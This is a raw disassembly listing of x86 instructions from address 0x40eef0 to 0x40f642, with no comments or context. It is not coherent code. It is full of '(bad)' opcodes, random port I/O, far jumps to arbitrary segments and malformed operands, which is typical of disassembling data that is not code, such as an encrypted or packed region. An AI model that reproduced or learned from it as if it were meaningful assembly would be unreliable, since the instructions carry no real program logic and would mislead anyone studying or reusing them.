  40eef0:	in     eax,dx
  40eef1:	out    0x37,eax
  40eef3:	int3   
  40eef4:	sbb    ch,bl
  40eef6:	lods   eax,DWORD PTR ds:[esi]
  40eef7:	pushf  
  40eef8:	(bad)  
  40eef9:	and    dl,ah
  40eefb:	in     al,dx
  40eefc:	xor    BYTE PTR [esi+0x67],al
  40eeff:	test   BYTE PTR [ecx],0xfe
  40ef02:	fcomp  QWORD PTR [esp+edi*1]
  40ef05:	rcr    DWORD PTR [esi],1
  40ef07:	mov    eax,DWORD PTR [ebp-0x5ab69e07]
  40ef0d:	sbb    ah,BYTE PTR [eax+0x20]
  40ef10:	or     eax,0x59daad0
  40ef15:	pop    ecx
  40ef16:	push   esp
  40ef17:	xchg   edi,eax
  40ef18:	outs   dx,BYTE PTR ds:[esi]
  40ef19:	push   esp
  40ef1a:	sub    BYTE PTR [eax-0x40],bl
  40ef1d:	(bad)
  40ef21:	aad    0x99
  40ef23:	(bad)  
  40ef24:	pop    DWORD PTR [edx]
  40ef26:	inc    BYTE PTR [ebx+0xd]
  40ef29:	xchg   BYTE PTR [eax+0x4db8a884],al
  40ef2f:	js     0x40ef9d
  40ef31:	stos   DWORD PTR es:[edi],eax
  40ef32:	(bad)  [ebx+0x7c8a3744]
  40ef38:	(bad)  
  40ef3a:	dec    DWORD PTR fs:[ebp+0x14]
  40ef3e:	lods   eax,DWORD PTR ds:[esi]
  40ef3f:	mov    dh,0x71
  40ef41:	loope  0x40eed5
  40ef43:	sub    eax,0x1ff97b2a
  40ef48:	push   eax
  40ef49:	or     ecx,eax
  40ef4b:	xor    BYTE PTR [esi-0xd],0x86
  40ef4f:	and    eax,0x4dc2e849
  40ef54:	and    cl,BYTE PTR [edx+0x51]
  40ef57:	imul   edi,DWORD PTR [edx],0xab091c58
  40ef5d:	iret   
  40ef5e:	cmp    DWORD PTR [eax],edi
  40ef60:	mov    ds:0xb76d4200,eax
  40ef65:	mov    dh,BYTE PTR [edx]
  40ef67:	stos   BYTE PTR es:[edi],al
  40ef68:	bound  esi,QWORD PTR ss:[edi+0x5979f301]
  40ef6f:	ret    
  40ef70:	jl     0x40efa8
  40ef72:	push   cs
  40ef73:	mov    dl,0x62
  40ef75:	pop    ebp
  40ef76:	jmp    DWORD PTR [ebx-0x67]
  40ef79:	xchg   edx,eax
  40ef7a:	dec    ebp
  40ef7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef7c:	dec    eax
  40ef7d:	xchg   ebx,eax
  40ef7e:	leave  
  40ef7f:	std    
  40ef80:	sbb    edi,DWORD PTR [ebp+0x4977a8fc]
  40ef86:	in     eax,dx
  40ef87:	or     DWORD PTR [edx+0x2daed575],edi
  40ef8d:	in     al,dx
  40ef8e:	mov    ecx,DWORD PTR [ebx-0x64]
  40ef91:	out    0x59,al
  40ef93:	xchg   ebp,eax
  40ef94:	and    eax,0xb35d704f
  40ef99:	pushf  
  40ef9a:	or     al,0x74
  40ef9c:	and    esi,esi
  40ef9e:	xor    BYTE PTR [eax-0x44],bl
  40efa1:	clc    
  40efa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa3:	cmc    
  40efa4:	push   ds
  40efa5:	add    edi,0xffffffdc
  40efa8:	test   BYTE PTR [ebx+0x29],cl
  40efab:	lods   al,BYTE PTR ds:[esi]
  40efac:	push   esi
  40efad:	mov    WORD PTR ds:0xe1c08bc4,gs
  40efb3:	pop    esi
  40efb4:	xlat   BYTE PTR ds:[ebx]
  40efb5:	mov    edi,0xe613e802
  40efba:	call   0x6a60:0x76dcf0b9
  40efc1:	adc    ch,dh
  40efc3:	mov    cl,0xa0
  40efc5:	fist   WORD PTR [edi]
  40efc7:	push   esp
  40efc8:	add    al,0x1d
  40efca:	pop    es
  40efcb:	jmp    0x40f048
  40efcd:	sbb    BYTE PTR [edi-0x1f],dl
  40efd0:	lahf   
  40efd1:	jmp    0xfbd3:0x3d87bfc9
  40efd8:	loop   0x40f01f
  40efda:	and    DWORD PTR [edi-0xb2de557],esp
  40efe0:	shl    DWORD PTR [ebp*4+0x1341cef],0x5c
  40efe8:	cmp    esi,DWORD PTR [ecx]
  40efea:	push   0x92f9972e
  40efef:	(bad)  
  40eff0:	imul   DWORD PTR [ebx]
  40eff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff3:	in     al,dx
  40eff4:	and    dh,dl
  40eff6:	inc    edi
  40eff7:	je     0x40efc9
  40eff9:	mov    ecx,0x14997bc9
  40effe:	push   0xdac6ee5d
  40f003:	data16 in al,dx
  40f005:	push   esi
  40f006:	out    0x53,eax
  40f008:	add    BYTE PTR [ebp-0x4a],0xa2
  40f00c:	sub    eax,0xa9a0c98a
  40f011:	out    dx,eax
  40f012:	nop
  40f013:	inc    edi
  40f014:	lods   eax,DWORD PTR ds:[esi]
  40f015:	cdq    
  40f016:	outs   dx,DWORD PTR ds:[esi]
  40f017:	fadd   DWORD PTR [ebx]
  40f019:	mov    edx,0x1f13a0dc
  40f01e:	push   0x7ab79208
  40f023:	push   es
  40f024:	dec    ebp
  40f025:	jecxz  0x40f065
  40f027:	xchg   DWORD PTR [ebp-0x1],ebp
  40f02a:	retf   
  40f02b:	push   0x89b38679
  40f030:	loope  0x40f001
  40f032:	pushf  
  40f033:	mov    ebx,ebx
  40f035:	data16 fst DWORD PTR [edi]
  40f038:	out    dx,eax
  40f039:	adc    al,0x32
  40f03b:	neg    DWORD PTR [edx+edx*8+0x7129f2cc]
  40f042:	xchg   edx,eax
  40f043:	mov    edi,ecx
  40f045:	lea    edx,ds:0x84fb7c33
  40f04b:	imul   edx,DWORD PTR ds:0x5c33a88a,0x5f8c9492
  40f055:	jge    0x40f05f
  40f057:	ret    
  40f058:	and    BYTE PTR [esi+0x6b],ah
  40f05b:	fs retf 0x76f4
  40f05f:	adc    al,0xd4
  40f061:	jno    0x40f0ca
  40f063:	push   es
  40f064:	scas   al,BYTE PTR es:[edi]
  40f065:	or     al,0x9d
  40f067:	sar    ah,0x67
  40f06a:	and    eax,DWORD PTR [edx]
  40f06c:	lods   al,BYTE PTR ds:[esi]
  40f06d:	in     eax,dx
  40f06e:	stc    
  40f06f:	xchg   ebp,eax
  40f070:	add    edx,DWORD PTR [edi+eiz*8]
  40f073:	daa    
  40f074:	sub    cl,BYTE PTR [ebx-0x3b]
  40f077:	sbb    ecx,esi
  40f079:	jbe    0x40f0e3
  40f07b:	std    
  40f07c:	call   0x7652:0xb907d6d4
  40f083:	pop    ebx
  40f084:	pop    ss
  40f085:	call   0xbd7b:0x685212c0
  40f08c:	mov    ecx,0x80bccfd0
  40f091:	call   0xe809:0xf76e464b
  40f098:	mov    edx,0x68b4ae55
  40f09d:	cli    
  40f09e:	jns    0x40f0a7
  40f0a0:	pop    ds
  40f0a1:	inc    ebx
  40f0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a3:	jbe    0x40f0c6
  40f0a5:	push   0xa7ba2003
  40f0aa:	fsubr  QWORD PTR [ebx+0x58]
  40f0ad:	in     al,0x92
  40f0af:	jecxz  0x40f0bf
  40f0b1:	jne    0x40f051
  40f0b3:	mov    ?,WORD PTR [ecx]
  40f0b5:	mov    eax,0x92719146
  40f0ba:	fdiv   st,st(4)
  40f0bc:	mov    dl,0x3
  40f0be:	lea    ebx,[eax]
  40f0c0:	xor    eax,0x27baf564
  40f0c5:	aas    
  40f0c6:	in     al,0x18
  40f0c8:	pop    eax
  40f0c9:	(bad)  
  40f0ca:	inc    esi
  40f0cb:	hlt    
  40f0cc:	cs std 
  40f0ce:	test   eax,0x909859c5
  40f0d4:	cmp    BYTE PTR [eax],0xc6
  40f0d7:	in     al,0xa7
  40f0d9:	push   esi
  40f0da:	icebp  
  40f0db:	xor    ebx,DWORD PTR [eax+esi*1+0x25fdafe9]
  40f0e2:	or     esi,ecx
  40f0e4:	sub    al,0xa6
  40f0e6:	push   ds
  40f0e7:	nop
  40f0e8:	push   ss
  40f0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ea:	jb     0x40f0c7
  40f0ec:	enter  0xf352,0xb8
  40f0f0:	repnz xor BYTE PTR [ebx+0x4ef12c6d],ah
  40f0f7:	jmp    0xea7a:0xcc71b7bc
  40f0fe:	cmp    BYTE PTR [eax],ah
  40f100:	push   edi
  40f101:	fs pusha 
  40f103:	sbb    BYTE PTR [edx],ah
  40f105:	stc    
  40f106:	aas    
  40f107:	push   0xfffffff6
  40f109:	push   cs
  40f10a:	adc    eax,esi
  40f10c:	punpckhdq mm4,QWORD PTR [edi+0x64]
  40f110:	mov    eax,0x3b2042bf
  40f115:	cwde   
  40f116:	(bad)  
  40f117:	mov    eax,ds:0x541b3d6e
  40f11c:	test   DWORD PTR [edx-0x385c147e],ebp
  40f122:	inc    ebx
  40f123:	push   ecx
  40f124:	gs (bad) 
  40f126:	ins    BYTE PTR es:[edi],dx
  40f127:	mov    ebx,0x65e6b51b
  40f12c:	int    0xd
  40f12e:	jl     0x40f178
  40f130:	push   ecx
  40f131:	dec    esi
  40f132:	clc    
  40f133:	test   eax,0x86b3a40b
  40f138:	or     al,BYTE PTR [eax-0x17db495f]
  40f13e:	push   ss
  40f13f:	pushf  
  40f140:	scas   eax,DWORD PTR es:[edi]
  40f141:	xor    eax,0xd969ae7e
  40f146:	pop    edi
  40f147:	pop    ecx
  40f148:	mov    bh,0x34
  40f14a:	sbb    edx,ebx
  40f14c:	push   ecx
  40f14d:	pop    esp
  40f14e:	jmp    0x40f1a3
  40f150:	or     al,0x70
  40f152:	pop    edi
  40f153:	je     0x40f13a
  40f155:	sub    al,0x72
  40f157:	fild   QWORD PTR [edi+0x4d]
  40f15a:	cmp    eax,DWORD PTR [eax+edx*8]
  40f15d:	xor    BYTE PTR [edx],0x24
  40f160:	push   cs
  40f161:	sub    bl,cl
  40f163:	inc    esp
  40f164:	outs   dx,DWORD PTR ds:[esi]
  40f165:	dec    edx
  40f166:	mov    cl,0x7
  40f168:	ins    DWORD PTR es:[edi],dx
  40f169:	push   0x391697cd
  40f16e:	cmc    
  40f16f:	call   FWORD PTR [ebx+0x2a9f9ac9]
  40f175:	stc    
  40f176:	mov    bl,0xc9
  40f178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f179:	and    eax,0xd51d8257
  40f17e:	fiadd  WORD PTR [edx*2-0x799b687a]
  40f185:	les    ecx,FWORD PTR [edi+0x23]
  40f188:	icebp  
  40f189:	outs   dx,DWORD PTR ds:[esi]
  40f18a:	das    
  40f18b:	das    
  40f18c:	dec    edx
  40f18d:	adc    ah,BYTE PTR [edi]
  40f18f:	lds    edx,FWORD PTR fs:[ecx]
  40f192:	dec    esp
  40f193:	adc    al,0x55
  40f195:	test   DWORD PTR [eax+0xe43d6b6],ecx
  40f19b:	cmc    
  40f19c:	jle    0x40f180
  40f19e:	dec    esi
  40f19f:	mov    eax,0x61d3e908
  40f1a4:	jmp    0x40f1d9
  40f1a6:	add    eax,0x57d894d6
  40f1ab:	dec    esi
  40f1ac:	jo     0x40f1ed
  40f1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1af:	jmp    FWORD PTR [ebp-0x60]
  40f1b2:	retf   0xfbb5
  40f1b5:	test   ecx,ebp
  40f1b7:	adc    esi,DWORD PTR [ebx-0x6864cea5]
  40f1bd:	dec    esi
  40f1be:	or     eax,0xef5228c2
  40f1c3:	gs dec ebp
  40f1c5:	jmp    0x40f22d
  40f1c7:	je     0x40f1fe
  40f1c9:	sub    al,0xc0
  40f1cb:	mov    ds:0xae097893,eax
  40f1d0:	(bad)  
  40f1d1:	mov    esp,0xf3cb9b9
  40f1d6:	push   esp
  40f1d7:	jle    0x40f218
  40f1d9:	ds int3 
  40f1db:	jmp    0x40f22e
  40f1dd:	mov    al,0xab
  40f1df:	sbb    al,0x1e
  40f1e1:	mul    DWORD PTR [ecx-0x5]
  40f1e4:	icebp  
  40f1e5:	inc    edx
  40f1e6:	call   0x4d11:0xd99e7d43
  40f1ed:	jge    0x40f1b8
  40f1ef:	sahf   
  40f1f0:	sar    BYTE PTR [ebx+0x0],cl
  40f1f3:	nop
  40f1f4:	aad    0xb1
  40f1f6:	popa   
  40f1f7:	fsubr  DWORD PTR [ecx]
  40f1f9:	out    0x8b,al
  40f1fb:	dec    ebp
  40f1fc:	sub    bh,bl
  40f1fe:	je     0x40f1f9
  40f200:	arpl   WORD PTR [edi-0x44],sp
  40f203:	aaa    
  40f204:	mov    DWORD PTR [eax-0x1136efbd],edx
  40f20a:	shl    BYTE PTR [ecx+0x74],cl
  40f20d:	pop    eax
  40f20e:	aaa    
  40f20f:	jo     0x40f24d
  40f211:	out    dx,eax
  40f212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f213:	xor    edx,DWORD PTR ds:0xa74f5a28
  40f219:	stos   BYTE PTR es:[edi],al
  40f21a:	xchg   edi,eax
  40f21b:	and    DWORD PTR [ebp-0x56],ebx
  40f21e:	out    0xf0,al
  40f220:	jo     0x40f23d
  40f222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f223:	aam    0x82
  40f225:	loope  0x40f24e
  40f227:	retf   0xebd5
  40f22a:	push   0xffffffbc
  40f22c:	and    bh,ch
  40f22e:	fs jge 0x40f1f8
  40f231:	lods   eax,DWORD PTR ds:[esi]
  40f232:	pop    ebp
  40f233:	adc    DWORD PTR [eax-0x32],ebp
  40f236:	je     0x40f1fe
  40f238:	jge    0x40f227
  40f23a:	lea    esi,[edx+edi*2-0x7f]
  40f23e:	aaa    
  40f23f:	lods   al,BYTE PTR ds:[esi]
  40f240:	fs mov bh,0x8c
  40f243:	(bad)  
  40f244:	js     0x40f276
  40f246:	retf   
  40f247:	dec    esp
  40f248:	call   0xb616b7d6
  40f24d:	xchg   edx,eax
  40f24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f24f:	xor    DWORD PTR [eax+ebp*1-0x7e],edx
  40f253:	sbb    al,BYTE PTR [ebx]
  40f255:	cdq    
  40f256:	idiv   BYTE PTR [ebx-0x3d]
  40f259:	lock imul DWORD PTR [edi-0x18007fc2]
  40f260:	ret    
  40f261:	and    DWORD PTR [ecx-0x1afaa178],0xfffffff2
  40f268:	ficomp DWORD PTR gs:[ebx-0x7cff39d]
  40f26f:	ja     0x40f26a
  40f271:	in     eax,dx
  40f272:	outs   dx,BYTE PTR ds:[esi]
  40f273:	imul   cl
  40f275:	jo     0x40f267
  40f277:	les    ebx,FWORD PTR [esi+edx*1-0x390bfac2]
  40f27e:	push   eax
  40f27f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f280:	mov    ah,0xde
  40f282:	les    esi,FWORD PTR [ecx-0x22c11579]
  40f288:	inc    ebx
  40f289:	xchg   edi,eax
  40f28a:	fdivrp st(6),st
  40f28c:	xchg   ecx,eax
  40f28d:	test   eax,0x5e0e6e4a
  40f292:	or     cl,BYTE PTR [ecx-0x5cad2315]
  40f298:	mov    bl,0xdb
  40f29a:	dec    edx
  40f29b:	rol    ch,1
  40f29d:	inc    ecx
  40f29e:	arpl   WORD PTR [ebx+0x40714079],dx
  40f2a4:	ds mov dh,bl
  40f2a7:	push   es
  40f2a8:	loop   0x40f281
  40f2aa:	shr    edi,cl
  40f2ac:	fimul  DWORD PTR [ebx]
  40f2ae:	sbb    DWORD PTR [edi+ebp*4-0x4],esp
  40f2b2:	mov    bl,0xc
  40f2b4:	push   ecx
  40f2b5:	push   0xffffffbb
  40f2b7:	leave  
  40f2b8:	push   ebp
  40f2b9:	retf   
  40f2ba:	cmp    al,0x92
  40f2bc:	pop    esp
  40f2bd:	test   al,0x29
  40f2bf:	pushf  
  40f2c0:	adc    ah,0x6e
  40f2c3:	sbb    dl,BYTE PTR [edx+0x2f069aed]
  40f2c9:	xchg   esp,eax
  40f2ca:	jg     0x40f31e
  40f2cc:	dec    ecx
  40f2cd:	popa   
  40f2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2cf:	cmp    al,0xb5
  40f2d1:	mov    bl,0x7e
  40f2d3:	pusha  
  40f2d4:	push   ds
  40f2d5:	cmp    DWORD PTR [esi],ebp
  40f2d7:	cld    
  40f2d8:	xor    DWORD PTR [ecx],ebp
  40f2da:	pop    ebx
  40f2db:	cli    
  40f2dc:	add    eax,0xc01cf583
  40f2e1:	push   ecx
  40f2e2:	mov    ds:0x22f000c1,al
  40f2e7:	in     al,0x6b
  40f2e9:	sbb    ecx,edx
  40f2eb:	push   0x935d6d8b
  40f2f0:	retf   0x8ffc
  40f2f3:	scas   al,BYTE PTR es:[edi]
  40f2f4:	std    
  40f2f5:	sbb    ebp,DWORD PTR [ecx]
  40f2f7:	push   edx
  40f2f8:	cs aaa 
  40f2fa:	cld    
  40f2fb:	rcr    DWORD PTR [edi+0x24],0xe2
  40f2ff:	jp     0x40f350
  40f301:	neg    BYTE PTR [ecx-0x6143a32c]
  40f307:	fimul  DWORD PTR ds:0x298b8a62
  40f30d:	mov    WORD PTR [edx-0x7f],fs
  40f310:	sub    DWORD PTR [esi-0xac15d47],0xd15825b7
  40f31a:	cmp    eax,0x4d3ab37f
  40f31f:	popa   
  40f320:	outs   dx,DWORD PTR ds:[esi]
  40f321:	xchg   ecx,eax
  40f322:	pop    es
  40f323:	sub    ch,bl
  40f325:	xchg   BYTE PTR [edx+0x122e4669],bl
  40f32b:	add    ah,ah
  40f32d:	xchg   esp,eax
  40f32e:	repnz push ebx
  40f330:	(bad)  
  40f331:	sub    al,cl
  40f333:	call   0xb8ba74c7
  40f338:	cmp    BYTE PTR [edx+0x62],bl
  40f33b:	inc    edi
  40f33c:	mov    edx,0xb024ff27
  40f341:	rol    DWORD PTR [ecx],1
  40f343:	add    DWORD PTR [ebp-0x7e9dd539],0xffffffcf
  40f34a:	lahf   
  40f34b:	ds adc eax,0xcf65245
  40f351:	jecxz  0x40f38f
  40f353:	in     eax,dx
  40f354:	and    DWORD PTR [ebp-0x637d70d7],eax
  40f35a:	in     eax,dx
  40f35b:	dec    ecx
  40f35c:	enter  0x2c90,0xbc
  40f360:	into   
  40f361:	or     BYTE PTR [ebx],cl
  40f363:	aaa    
  40f364:	pop    eax
  40f365:	cmp    al,0xe9
  40f367:	stos   BYTE PTR es:[edi],al
  40f368:	sbb    DWORD PTR [ebx+esi*4],ecx
  40f36b:	pushf  
  40f36c:	out    0x70,al
  40f36e:	fld    DWORD PTR ds:0x322de62b
  40f374:	cli    
  40f375:	mov    ds:0xa4e5adcf,al
  40f37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f37b:	jle    0x40f377
  40f37d:	xchg   esi,eax
  40f37e:	jmp    0x52e63af5
  40f383:	xchg   esi,eax
  40f384:	rcl    eax,0x94
  40f387:	popf   
  40f388:	mov    DWORD PTR [edi+0x1a],eax
  40f38b:	cmp    esp,DWORD PTR [eax]
  40f38d:	leave  
  40f38e:	jp     0x40f386
  40f390:	mov    esi,0x611b95db
  40f395:	sub    DWORD PTR [edx-0x3d68e706],ecx
  40f39b:	cs ja  0x40f389
  40f39e:	xor    esi,DWORD PTR [edx]
  40f3a0:	push   edx
  40f3a1:	hlt    
  40f3a2:	push   esi
  40f3a3:	add    al,0xdd
  40f3a5:	sub    al,0xa
  40f3a8:	xor    esi,DWORD PTR [esp+eax*1-0x7]
  40f3ac:	xchg   esi,eax
  40f3ad:	loop   0x40f3b8
  40f3af:	add    ch,dl
  40f3b1:	mov    dl,0x6c
  40f3b3:	push   cs
  40f3b4:	ficomp WORD PTR [edi-0x68949d34]
  40f3ba:	adc    ah,dh
  40f3bc:	out    dx,eax
  40f3bd:	test   BYTE PTR [eax-0x55324d42],dh
  40f3c3:	or     ebp,DWORD PTR [edx+0x7a]
  40f3c6:	shl    DWORD PTR [edi],cl
  40f3c8:	jle    0x40f397
  40f3ca:	scas   eax,DWORD PTR es:[edi]
  40f3cb:	jmp    0x40f37d
  40f3cd:	cmc    
  40f3ce:	jl     0x40f366
  40f3d0:	mov    edx,0xf474673e
  40f3d5:	jns    0x40f3e1
  40f3d7:	or     dh,bh
  40f3d9:	inc    eax
  40f3da:	retf   
  40f3db:	in     al,dx
  40f3dc:	call   FWORD PTR [esi+0x7e136a63]
  40f3e2:	pop    esp
  40f3e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e4:	push   ebp
  40f3e5:	cmp    eax,0x436b11ed
  40f3ea:	mov    gs,WORD PTR [ebp+0x24]
  40f3ed:	cmp    BYTE PTR [eax],dh
  40f3ef:	shl    BYTE PTR [esi],0x73
  40f3f2:	fs scas ax,WORD PTR es:[edi]
  40f3f5:	loopne 0x40f3b3
  40f3f7:	lock add bh,BYTE PTR [ecx+ebp*2-0x3faac238]
  40f3ff:	enter  0x64a6,0xbd
  40f403:	push   es
  40f404:	cmp    dl,ch
  40f406:	xchg   edx,eax
  40f407:	jle    0x40f3b6
  40f409:	mov    eax,ds:0x5e029743
  40f40e:	fsub   st(2),st
  40f410:	adc    eax,0xadf6e168
  40f415:	inc    ebp
  40f416:	out    0x51,eax
  40f418:	xchg   ebp,eax
  40f419:	js     0x40f441
  40f41b:	sub    cl,0x24
  40f41e:	add    bl,bl
  40f420:	or     edx,DWORD PTR [eax+0x1df22a75]
  40f426:	mov    esi,0xe546a409
  40f42b:	xor    eax,0x3feec9ce
  40f430:	xor    DWORD PTR [ebp-0x73ba63f5],0xffffffec
  40f437:	les    ecx,FWORD PTR [eax+eiz*2+0x14994b3f]
  40f43e:	cmp    esi,DWORD PTR [esi+0x115c8012]
  40f444:	out    dx,eax
  40f445:	pop    edx
  40f446:	sub    eax,0xffffff9d
  40f449:	dec    edx
  40f44a:	cmp    ah,BYTE PTR [ecx+0x35192244]
  40f450:	ffreep st(1)
  40f452:	popa   
  40f453:	push   0xfa9a3e7f
  40f458:	inc    edx
  40f459:	retf   0x264d
  40f45c:	mov    dl,0x8d
  40f45e:	dec    esp
  40f45f:	push   esi
  40f460:	or     BYTE PTR [ebx-0x26e409e],cl
  40f466:	dec    esp
  40f467:	cld    
  40f468:	in     al,0x76
  40f46a:	outs   dx,DWORD PTR ds:[esi]
  40f46b:	pop    ss
  40f46c:	xchg   esp,eax
  40f46d:	and    al,0x87
  40f470:	mov    edx,0xa4177d9a
  40f475:	xor    al,0x13
  40f477:	pusha  
  40f478:	cmp    al,BYTE PTR [edx-0x21]
  40f47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f47c:	jmp    0x40f476
  40f47e:	in     al,0x12
  40f480:	ret    
  40f481:	ss sbb cl,al
  40f484:	adc    BYTE PTR [edi+ebx*8-0x4a95a025],0xfc
  40f48c:	adc    ah,ah
  40f48e:	lahf   
  40f48f:	push   es
  40f490:	cmp    BYTE PTR [eax-0x7fe1f8c3],0x98
  40f497:	jle    0x40f508
  40f499:	add    eax,0x5d2d98f2
  40f49e:	cld    
  40f49f:	aaa    
  40f4a0:	jae    0x40f478
  40f4a2:	shr    BYTE PTR [ebp+0x227876e6],0x87
  40f4a9:	sub    bl,dl
  40f4ab:	outs   dx,DWORD PTR ds:[esi]
  40f4ac:	retf   0x5834
  40f4af:	sub    DWORD PTR [edi+0x5c],ebx
  40f4b2:	add    DWORD PTR [esi-0x4aa3e36],ebx
  40f4b8:	sub    al,0x17
  40f4ba:	pop    es
  40f4bb:	sbb    bh,ch
  40f4bd:	ficom  DWORD PTR ss:[edx+0x51fe90d3]
  40f4c4:	add    eax,0xfba60a1d
  40f4c9:	pop    edi
  40f4ca:	xor    eax,DWORD PTR [esp+eiz*8-0x33]
  40f4ce:	mul    DWORD PTR [ebp+0x14]
  40f4d1:	idiv   bl
  40f4d3:	inc    ebx
  40f4d4:	outs   dx,DWORD PTR ds:[esi]
  40f4d5:	cdq    
  40f4d6:	mov    ecx,0xa1aeb524
  40f4db:	mov    edi,0x6b0b50b2
  40f4e0:	lods   eax,DWORD PTR ds:[esi]
  40f4e1:	in     al,dx
  40f4e2:	xchg   esp,eax
  40f4e3:	xor    DWORD PTR [ebx+0x0],ecx
  40f4e6:	jne    0x40f50b
  40f4e8:	cdq    
  40f4e9:	push   0xd65a3caf
  40f4ee:	pop    ebp
  40f4ef:	fst    DWORD PTR [edi-0x30]
  40f4f2:	pop    ss
  40f4f3:	pop    eax
  40f4f4:	in     al,dx
  40f4f5:	in     eax,dx
  40f4f6:	dec    edx
  40f4f7:	push   esp
  40f4f8:	jmp    0x14740e60
  40f4fd:	or     ah,BYTE PTR [eax-0x7f0b6d8f]
  40f503:	pop    esi
  40f504:	cmp    al,0x53
  40f506:	lods   eax,DWORD PTR ds:[esi]
  40f507:	lds    ecx,FWORD PTR [esi]
  40f509:	sub    DWORD PTR [edx+0x79],edi
  40f50c:	xor    BYTE PTR [edi+0x1c8f7d98],dl
  40f512:	cmp    edx,DWORD PTR [ebx+0x6a6ea0f4]
  40f518:	jp     0x40f4d2
  40f51a:	fs adc eax,0xec710d0f
  40f520:	out    0x8,eax
  40f522:	js     0x40f4ee
  40f524:	add    BYTE PTR [eax],dh
  40f526:	adc    ah,BYTE PTR [ecx]
  40f528:	and    al,0xfd
  40f52a:	push   0xfffffff9
  40f52c:	xchg   esi,eax
  40f52d:	nop
  40f52e:	inc    ebx
  40f52f:	loopne 0x40f527
  40f531:	shr    BYTE PTR [ebx+0x10],cl
  40f534:	aaa    
  40f535:	test   al,0xb3
  40f537:	mov    dl,0xa5
  40f539:	rcr    WORD PTR [ebx+0x2108ad96],cl
  40f540:	jge    0x40f4f1
  40f542:	pop    es
  40f543:	push   cs
  40f544:	and    ecx,edi
  40f546:	sub    esi,DWORD PTR [esi]
  40f548:	repz inc ebp
  40f54a:	sbb    BYTE PTR [ecx-0x1516244],0x7c
  40f551:	in     eax,0x47
  40f553:	leave  
  40f554:	cmp    eax,0x7c15bc4c
  40f559:	fcmovnu st,st(0)
  40f55b:	mov    dl,0xec
  40f55d:	loopne 0x40f4e8
  40f55f:	lods   eax,DWORD PTR ds:[esi]
  40f560:	xchg   edx,eax
  40f561:	xor    DWORD PTR [edi-0x6a88f0fd],edx
  40f567:	xor    al,0x59
  40f569:	shl    BYTE PTR [esi-0x50],0x31
  40f56d:	mov    ?,WORD PTR [edx+0x6cc081c1]
  40f573:	xchg   ebp,eax
  40f574:	jno    0x40f57f
  40f576:	out    dx,eax
  40f577:	push   0x72
  40f579:	inc    ebp
  40f57a:	shl    BYTE PTR [edx+0x420714ca],cl
  40f580:	dec    ecx
  40f581:	sub    al,0xf
  40f583:	mov    dl,BYTE PTR [eax-0x38de9ffb]
  40f589:	pusha  
  40f58a:	xor    DWORD PTR [ecx],eax
  40f58c:	pop    esp
  40f58d:	stos   DWORD PTR es:[edi],eax
  40f58e:	sbb    DWORD PTR [esi-0x25],ebp
  40f591:	outs   dx,BYTE PTR ds:[esi]
  40f592:	cmc    
  40f593:	(bad)  
  40f594:	jge    0x40f583
  40f596:	outs   dx,DWORD PTR ds:[esi]
  40f597:	mov    ds:0x698a94af,al
  40f59c:	inc    esp
  40f59d:	pop    ss
  40f59e:	xchg   DWORD PTR [edx],edx
  40f5a0:	lds    edx,FWORD PTR [edx-0x2be31888]
  40f5a6:	sub    DWORD PTR [eax],edi
  40f5a8:	add    ecx,ebp
  40f5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ab:	jmp    0x798a:0xdd638845
  40f5b2:	lahf   
  40f5b3:	mov    cl,0x9d
  40f5b5:	inc    edi
  40f5b6:	nop    DWORD PTR [ebx+0x579e8bb3]
  40f5bd:	out    dx,ax
  40f5bf:	pusha  
  40f5c0:	sub    cl,ch
  40f5c2:	sub    cl,BYTE PTR [edi+0x23]
  40f5c5:	mov    dl,cl
  40f5c7:	pop    ds
  40f5c8:	ins    DWORD PTR es:[edi],dx
  40f5c9:	std    
  40f5ca:	fistp  WORD PTR [eax]
  40f5cc:	pop    ebp
  40f5cd:	sahf   
  40f5ce:	stos   BYTE PTR es:[edi],al
  40f5cf:	cli    
  40f5d0:	inc    DWORD PTR [eax-0x62a46a2a]
  40f5d6:	mov    cl,0xa7
  40f5d8:	sbb    al,0xba
  40f5da:	lea    edi,[edi+0x7b]
  40f5dd:	fstp   DWORD PTR [ebp+0x15]
  40f5e0:	rcl    DWORD PTR [esi-0x21],cl
  40f5e3:	jp     0x40f5a4
  40f5e5:	cmp    dh,BYTE PTR [ebp-0x65c79f5]
  40f5eb:	push   ebx
  40f5ec:	mov    ebp,0x7ecc3ae
  40f5f1:	cmp    DWORD PTR [esi],edx
  40f5f3:	cld    
  40f5f4:	test   al,0xf0
  40f5f6:	jne    0x40f5ca
  40f5f8:	adc    DWORD PTR [ebx+esi*2-0x19b8f100],0xc05294a1
  40f603:	xor    dh,BYTE PTR [ebx+0x7d]
  40f606:	and    al,0x32
  40f608:	hlt    
  40f609:	add    al,0x30
  40f60b:	mov    eax,ds:0x5f28c340
  40f610:	sub    cl,BYTE PTR [ebx]
  40f612:	aaa    
  40f613:	xor    bh,ah
  40f615:	lahf   
  40f616:	ds dec ebp
  40f618:	inc    eax
  40f619:	bnd jle 0x40f5bd
  40f61c:	pop    esp
  40f61d:	imul   ebx,DWORD PTR [ebp+eax*2+0xb91ee51],0x1f
  40f625:	(bad)  
  40f626:	jmp    0x40f640
  40f628:	mov    eax,0x6f68af5a
  40f62d:	fnstenv [ecx]
  40f62f:	in     eax,dx
  40f630:	repz test DWORD PTR [edi+0x71f75eb6],esi
  40f637:	imul   ecx,DWORD PTR [ecx-0x53],0xeb8b04db
  40f63e:	out    0xe3,eax
  40f640:	pop    ebx
  40f641:	push   cs
  40f642:	adc    ebp,ebx
